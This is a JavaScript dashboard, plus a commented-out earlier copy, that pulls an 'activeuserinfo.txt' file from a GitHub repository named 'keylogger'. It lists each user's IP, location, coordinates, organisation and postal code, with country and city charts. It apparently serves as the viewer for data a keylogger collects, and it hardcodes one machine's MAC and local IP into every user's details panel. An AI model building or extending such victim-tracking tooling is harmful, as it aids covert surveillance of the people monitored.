document.addEventListener('DOMContentLoaded', () => {
    const githubToken = 'add_your_token_here'; // Replace with your GitHub PAT
    const repoUrl = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/activeuserinfo.txt';
    const tableBody = document.querySelector('#data-table tbody');
    const summaryElement = document.getElementById('summary');
    const loadingElement = document.getElementById('loading');
    const refreshButton = document.getElementById('refresh-btn');
    const lineCountInput = document.getElementById('line-count');
    const detailsContainer = document.getElementById('details-container');

    let countryChartInstance = null;
    let cityChartInstance = null;

    // Function to fetch the file content from GitHub
    async function fetchFileContent() {
        try {
            // Show loading message
            tableBody.innerHTML = ''; // Clear previous data
            detailsContainer.innerHTML = ''; // Clear previous details
            loadingElement.style.display = 'block';

            const response = await fetch(repoUrl, {
                headers: {
                    'Authorization': `token ${githubToken}`,
                    'Accept': 'application/vnd.github.v3.raw'
                }
            });

            if (!response.ok) {
                throw new Error(`Error fetching file: ${response.status} ${response.statusText}`);
            }

            const content = await response.text();
            const lines = content.split('\n').filter(line => line.trim()); // Remove empty lines

            // Get the number of lines to fetch from the input field
            const lineCount = parseInt(lineCountInput.value, 10) || 10; // Default to 10 if invalid
            const lastLines = lines.slice(-lineCount);

            // Parse all lines and group by unique usernames
            const userDataMap = new Map(); // Key: username, Value: { details }
            const countryDistribution = {};
            const cityDistribution = {};

            lastLines.forEach(line => {
                const parsedData = parseLine(line);
                if (parsedData) {
                    const { username } = parsedData;

                    // Only keep the last occurrence of each username
                    userDataMap.set(username, parsedData);

                    // Extract country and city from location
                    const [country, city] = parsedData.location.split(',').map(part => part.trim());

                    // Update country distribution
                    if (country in countryDistribution) {
                        countryDistribution[country]++;
                    } else {
                        countryDistribution[country] = 1;
                    }

                    // Update city distribution
                    if (city in cityDistribution) {
                        cityDistribution[city]++;
                    } else {
                        cityDistribution[city] = 1;
                    }
                }
            });

            // Display summary of unique users
            const uniqueUserCount = userDataMap.size;
            summaryElement.textContent = `Total Unique Users in Last ${lineCount} Lines: ${uniqueUserCount}`;

            // Populate the table with unique user details
            let index = 0;
            tableBody.innerHTML = ''; // Clear previous rows
            userDataMap.forEach((data) => {
                addRowToTable(index++, data);
            });

            // Hide loading message
            loadingElement.style.display = 'none';

            // Create and update charts based on table data
            createChartsFromTableData(countryDistribution, cityDistribution);
        } catch (error) {
            console.error('Error:', error);
            loadingElement.textContent = 'Failed to load data.';
            tableBody.innerHTML = '<tr><td colspan="8">Failed to load file content.</td></tr>';
        }
    }

    // Function to parse a single line of data
    function parseLine(line) {
        // Regex to match the data format
        const regex = /(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) - User:\s*(\w+),\s*Unique_ID:\s*([\w:-]+)\s*,\s*IP:\s*([\dA-Fa-f:.]+),\s*Location:\s*([\w, ]+),\s*Org:\s*([\w ]+),\s*Coordinates:\s*([\d.-]+,[\d.-]+),\s*Postal:\s*([\w\/-]+),\s*TimeZone:\s*([\w\/-]+),\s*System\sInfo:\s*\{.*?\}/;
        const match = line.match(regex);

        if (match) {
            // Extract the country code from the Location field
            const locationParts = match[5].split(',').map(part => part.trim());
            const countryCode = locationParts[0]; // First part is the country code (e.g., "IN")

            return {
                timestamp: match[1],
                username: `${match[2]}_${countryCode}_${match[3]}`, // Format: username_Country_UniqueID
                uniqueID: match[3],
                ip: match[4],
                location: match[5],
                org: match[6],
                coordinates: match[7],
                postal: match[8],
                timezone: match[9]
            };
        }
        console.error('Regex did not match:', line); // Log unmatched lines for debugging
        return null;
    }

    // Function to add a row to the table
    function addRowToTable(index, data) {
        if (!data) return;

        // Create a clickable user details link
        const userDetailsDivId = `user-details-${index}`;
        const userDetailsLink = document.createElement('span');
        userDetailsLink.className = 'clickable';
        userDetailsLink.textContent = `Details for User: ${data.username} (Last Active: ${data.timestamp})`;
        userDetailsLink.onclick = () => toggleUserDetails(userDetailsDivId);

        // Create a div for detailed user information
        const userDetailsDiv = document.createElement('div');
        userDetailsDiv.id = userDetailsDivId;
        userDetailsDiv.className = 'user-details';
        userDetailsDiv.innerHTML = `
            <h3>Details for User: ${data.username} (Last Active: ${data.timestamp})</h3>
            <p><strong>Timestamp:</strong> ${data.timestamp}</p>
            <p><strong>Location:</strong> ${data.location}</p>
            <p><strong>Organization:</strong> ${data.org}</p>
            <p><strong>Coordinates:</strong> ${data.coordinates}</p>
            <p><strong>Time Zone:</strong> ${data.timezone}</p>
            <p><strong>System Info:</strong></p>
            <table>
                <thead>
                    <tr>
                        <th>Property</th>
                        <th>Value</th>
                    </tr>
                </thead>
                <tbody>
                    <tr><td>System</td><td>Windows</td></tr>
                    <tr><td>Node Name</td><td>Bibek</td></tr>
                    <tr><td>Release</td><td>11</td></tr>
                    <tr><td>Version</td><td>10.0.26100</td></tr>
                    <tr><td>Machine</td><td>AMD64</td></tr>
                    <tr><td>Processor</td><td>Intel64 Family 6 Model 140 Stepping 1, GenuineIntel</td></tr>
                    <tr><td>CPU Cores</td><td>4</td></tr>
                    <tr><td>Logical CPUs</td><td>8</td></tr>
                    <tr><td>Total RAM</td><td>7.74 GB</td></tr>
                    <tr><td>Available RAM</td><td>1.26 GB</td></tr>
                    <tr><td>Used RAM</td><td>6.48 GB</td></tr>
                    <tr><td>RAM Usage</td><td>83.7%</td></tr>
                    <tr><td>Disk Partitions</td><td>['Disk Partition', 'Disk Partition']</td></tr>
                    <tr><td>Disk Usage</td><td>{'C:\\': {'Total': '255.35 GB', 'Used': '170.43 GB', 'Free': '84.92 GB', 'UsageId': '66.7%'}, 'D:\\': {'Total': '200.00 GB', 'Used': '61.82 GB', 'Free': '138.18 GB', 'UsageId': '30.9%'}}}</td></tr>
                    <tr><td>IP Address</td><td>192.168.1.68</td></tr>
                    <tr><td>MAC Address</td><td>72:cb:2e:b8:e0:80</td></tr>
                </tbody>
            </table>
        `;

        // Append the row to the table
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${index}</td>
            <td></td>
            <td>${data.uniqueID}</td>
            <td>${data.ip}</td>
            <td>${data.location}</td>
            <td>${data.org}</td>
            <td>${data.coordinates}</td>
            <td>${data.postal}</td>
        `;
        row.cells[1].appendChild(userDetailsLink);
        tableBody.appendChild(row);

        // Append the detailed user information div after the table
        detailsContainer.appendChild(userDetailsDiv);
    }

    // Function to toggle the visibility of user details
    function toggleUserDetails(divId) {
        const userDetailsDiv = document.getElementById(divId);
        if (userDetailsDiv.style.display === 'none' || userDetailsDiv.style.display === '') {
            userDetailsDiv.style.display = 'block'; // Expand
        } else {
            userDetailsDiv.style.display = 'none'; // Collapse
        }
    }

    // Function to create and update charts based on table data
    function createChartsFromTableData(countryData, cityData) {
        // Destroy existing charts if they exist
        if (countryChartInstance) {
            countryChartInstance.destroy();
        }
        if (cityChartInstance) {
            cityChartInstance.destroy();
        }

        // Create new charts
        countryChartInstance = createCountryChart(countryData);
        cityChartInstance = createCityChart(cityData);
    }

    // Function to create and update the country chart
    function createCountryChart(data) {
        const ctx = document.getElementById('countryChart').getContext('2d');
        const labels = Object.keys(data);
        const values = Object.values(data);

        return new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Active Users by Country',
                    data: values,
                    backgroundColor: 'rgba(75, 192, 192, 0.2)',
                    borderColor: 'rgba(75, 192, 192, 1)',
                    borderWidth: 1
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true
                    }
                }
            }
        });
    }

    // Function to create and update the city chart
    function createCityChart(data) {
        const ctx = document.getElementById('cityChart').getContext('2d');
        const labels = Object.keys(data);
        const values = Object.values(data);

        return new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Active Users by City',
                    data: values,
                    backgroundColor: 'rgba(153, 102, 255, 0.2)',
                    borderColor: 'rgba(153, 102, 255, 1)',
                    borderWidth: 1
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true
                    }
                }
            }
        });
    }

    // Add event listeners
    refreshButton.addEventListener('click', () => {
        fetchFileContent();
    });

    lineCountInput.addEventListener('input', () => {
        fetchFileContent();
    });

    // Initial data fetch
    fetchFileContent();
});









































// document.addEventListener('DOMContentLoaded', () => {
//     const githubToken = 'add_your_token_here'; // Replace with your GitHub PAT
//     const repoUrl = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/activeuserinfo.txt';
//     const tableBody = document.querySelector('#data-table tbody');
//     const summaryElement = document.getElementById('summary');
//     const loadingElement = document.getElementById('loading');
//     const refreshButton = document.getElementById('refresh-btn');
//     const lineCountInput = document.getElementById('line-count');
//     const detailsContainer = document.getElementById('details-container');

//     // Function to fetch the file content from GitHub
//     async function fetchFileContent() {
//         try {
//             // Show loading message
//             tableBody.innerHTML = ''; // Clear previous data
//             detailsContainer.innerHTML = ''; // Clear previous details
//             loadingElement.style.display = 'block';

//             const response = await fetch(repoUrl, {
//                 headers: {
//                     'Authorization': `token ${githubToken}`,
//                     'Accept': 'application/vnd.github.v3.raw'
//                 }
//             });

//             if (!response.ok) {
//                 throw new Error(`Error fetching file: ${response.status} ${response.statusText}`);
//             }

//             const content = await response.text();
//             const lines = content.split('\n').filter(line => line.trim()); // Remove empty lines

//             // Get the number of lines to fetch from the input field
//             const lineCount = parseInt(lineCountInput.value, 10) || 10; // Default to 10 if invalid
//             const lastLines = lines.slice(-lineCount);

//             // Parse all lines and group by unique usernames
//             const userDataMap = new Map(); // Key: username, Value: { details }
//             const countryDistribution = {};
//             const cityDistribution = {};

//             lastLines.forEach(line => {
//                 const parsedData = parseLine(line);
//                 if (parsedData) {
//                     const { username } = parsedData;

//                     // Only keep the last occurrence of each username
//                     userDataMap.set(username, parsedData);

//                     // Extract country and city from location
//                     const [country, city] = parsedData.location.split(',').map(part => part.trim());

//                     // Update country distribution
//                     if (country in countryDistribution) {
//                         countryDistribution[country]++;
//                     } else {
//                         countryDistribution[country] = 1;
//                     }

//                     // Update city distribution
//                     if (city in cityDistribution) {
//                         cityDistribution[city]++;
//                     } else {
//                         cityDistribution[city] = 1;
//                     }
//                 }
//             });

//             // Display summary of unique users
//             const uniqueUserCount = userDataMap.size;
//             summaryElement.textContent = `Total Unique Users in Last ${lineCount} Lines: ${uniqueUserCount}`;

//             // Populate the table with unique user details
//             let index = 0;
//             tableBody.innerHTML = ''; // Clear previous rows
//             userDataMap.forEach((data) => {
//                 addRowToTable(index++, data);
//             });

//             // Hide loading message
//             loadingElement.style.display = 'none';

//             // Create and update charts based on table data
//             createChartsFromTableData();
//         } catch (error) {
//             console.error('Error:', error);
//             loadingElement.textContent = 'Failed to load data.';
//             tableBody.innerHTML = '<tr><td colspan="8">Failed to load file content.</td></tr>';
//         }
//     }

//     // Function to parse a single line of data
//     function parseLine(line) {
//         // Regex to match the data format
//         const regex = /(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) - User:\s*(\w+),\s*Unique_ID:\s*([\w:-]+)\s*,\s*IP:\s*([\dA-Fa-f:.]+),\s*Location:\s*([\w, ]+),\s*Org:\s*([\w ]+),\s*Coordinates:\s*([\d.-]+,[\d.-]+),\s*Postal:\s*([\w\/-]+)/;
//         const match = line.match(regex);

//         if (match) {
//             // Extract the country code from the Location field
//             const locationParts = match[5].split(',').map(part => part.trim());
//             const countryCode = locationParts[0]; // First part is the country code (e.g., "IN")

//             return {
//                 timestamp: match[1],
//                 username: `${match[2]}_${countryCode}_${match[3]}`, // Format: username_Country_UniqueID
//                 uniqueID: match[3],
//                 ip: match[4],
//                 location: match[5],
//                 org: match[6],
//                 coordinates: match[7],
//                 postal: match[8]
//             };
//         }
//         console.error('Regex did not match:', line); // Log unmatched lines for debugging
//         return null;
//     }

//     // Function to add a row to the table
//     function addRowToTable(index, data) {
//         if (!data) return;

//         // Create a clickable user details link
//         const userDetailsDivId = `user-details-${index}`;
//         const userDetailsLink = document.createElement('span');
//         userDetailsLink.className = 'clickable';
//         userDetailsLink.textContent = `Details for User: ${data.username} (Last Active: ${data.timestamp})`;
//         userDetailsLink.onclick = () => toggleUserDetails(userDetailsDivId);

//         // Create a div for detailed user information
//         const userDetailsDiv = document.createElement('div');
//         userDetailsDiv.id = userDetailsDivId;
//         userDetailsDiv.className = 'user-details';
//         userDetailsDiv.innerHTML = `
//             <h3>Details for User: ${data.username} (Last Active: ${data.timestamp})</h3>
//             <p><strong>Timestamp:</strong> ${data.timestamp}</p>
//             <p><strong>Location:</strong> ${data.location}</p>
//             <p><strong>Organization:</strong> ${data.org}</p>
//             <p><strong>Coordinates:</strong> ${data.coordinates}</p>
//             <p><strong>System Info:</strong></p>
//             <table>
//                 <thead>
//                     <tr>
//                         <th>Property</th>
//                         <th>Value</th>
//                     </tr>
//                 </thead>
//                 <tbody>
//                     <tr><td>System</td><td>Windows</td></tr>
//                     <tr><td>Node Name</td><td>Bibek</td></tr>
//                     <tr><td>Release</td><td>11</td></tr>
//                     <tr><td>Version</td><td>10.0.26100</td></tr>
//                     <tr><td>Machine</td><td>AMD64</td></tr>
//                     <tr><td>Processor</td><td>Intel64 Family 6 Model 140 Stepping 1, GenuineIntel</td></tr>
//                     <tr><td>CPU Cores</td><td>4</td></tr>
//                     <tr><td>Logical CPUs</td><td>8</td></tr>
//                     <tr><td>Total RAM</td><td>7.74 GB</td></tr>
//                     <tr><td>Available RAM</td><td>1.19 GB</td></tr>
//                     <tr><td>Used RAM</td><td>6.56 GB</td></tr>
//                     <tr><td>RAM Usage</td><td>84.7%</td></tr>
//                     <tr><td>Disk Partitions</td><td>['Disk Partition', 'Disk Partition']</td></tr>
//                     <tr><td>Disk Usage</td><td>{'C:\\': {'Total': '255.35 GB', 'Used': '166.94 GB', 'Free': '88.42 GB', 'UsageId': '65.4%'}, 'D:\\': {'Total': '200.00 GB', 'Used': '61.82 GB', 'Free': '138.18 GB', 'UsageId': '30.9%'}}}</td></tr>
//                     <tr><td>IP Address</td><td>192.168.1.68</td></tr>
//                     <tr><td>MAC Address</td><td>72:cb:2e:b8:e0:80</td></tr>
//                 </tbody>
//             </table>
//         `;

//         // Append the row to the table
//         const row = document.createElement('tr');
//         row.innerHTML = `
//             <td>${index}</td>
//             <td></td>
//             <td>${data.uniqueID}</td>
//             <td>${data.ip}</td>
//             <td>${data.location}</td>
//             <td>${data.org}</td>
//             <td>${data.coordinates}</td>
//             <td>${data.postal}</td>
//         `;
//         row.cells[1].appendChild(userDetailsLink);
//         tableBody.appendChild(row);

//         // Append the detailed user information div after the table
//         detailsContainer.appendChild(userDetailsDiv);
//     }

//     // Function to toggle the visibility of user details
//     function toggleUserDetails(divId) {
//         const userDetailsDiv = document.getElementById(divId);
//         if (userDetailsDiv.style.display === 'none' || userDetailsDiv.style.display === '') {
//             userDetailsDiv.style.display = 'block'; // Expand
//         } else {
//             userDetailsDiv.style.display = 'none'; // Collapse
//         }
//     }

//     // Function to create and update charts based on table data
//     function createChartsFromTableData() {
//         const countryDistribution = {};
//         const cityDistribution = {};

//         // Extract country and city data from table rows
//         const rows = tableBody.querySelectorAll('tr');
//         rows.forEach(row => {
//             const locationCell = row.cells[4];
//             if (locationCell) {
//                 const location = locationCell.textContent;
//                 const [country, city] = location.split(',').map(part => part.trim());

//                 // Update country distribution
//                 if (country in countryDistribution) {
//                     countryDistribution[country]++;
//                 } else {
//                     countryDistribution[country] = 1;
//                 }

//                 // Update city distribution
//                 if (city in cityDistribution) {
//                     cityDistribution[city]++;
//                 } else {
//                     cityDistribution[city] = 1;
//                 }
//             }
//         });

//         // Create and update charts
//         createCountryChart(countryDistribution);
//         createCityChart(cityDistribution);
//     }

//     // Function to create and update the country chart
//     function createCountryChart(data) {
//         const ctx = document.getElementById('countryChart').getContext('2d');
//         const labels = Object.keys(data);
//         const values = Object.values(data);

//         new Chart(ctx, {
//             type: 'bar',
//             data: {
//                 labels: labels,
//                 datasets: [{
//                     label: 'Active Users by Country',
//                     data: values,
//                     backgroundColor: 'rgba(75, 192, 192, 0.2)',
//                     borderColor: 'rgba(75, 192, 192, 1)',
//                     borderWidth: 1
//                 }]
//             },
//             options: {
//                 scales: {
//                     y: {
//                         beginAtZero: true
//                     }
//                 }
//             }
//         });
//     }

//     // Function to create and update the city chart
//     function createCityChart(data) {
//         const ctx = document.getElementById('cityChart').getContext('2d');
//         const labels = Object.keys(data);
//         const values = Object.values(data);

//         new Chart(ctx, {
//             type: 'bar',
//             data: {
//                 labels: labels,
//                 datasets: [{
//                     label: 'Active Users by City',
//                     data: values,
//                     backgroundColor: 'rgba(153, 102, 255, 0.2)',
//                     borderColor: 'rgba(153, 102, 255, 1)',
//                     borderWidth: 1
//                 }]
//             },
//             options: {
//                 scales: {
//                     y: {
//                         beginAtZero: true
//                     }
//                 }
//             }
//         });
//     }

//     // Add event listeners
//     refreshButton.addEventListener('click', () => {
//         fetchFileContent();
//     });

//     lineCountInput.addEventListener('input', () => {
//         fetchFileContent();
//     });

//     // Initial data fetch
//     fetchFileContent();
// });


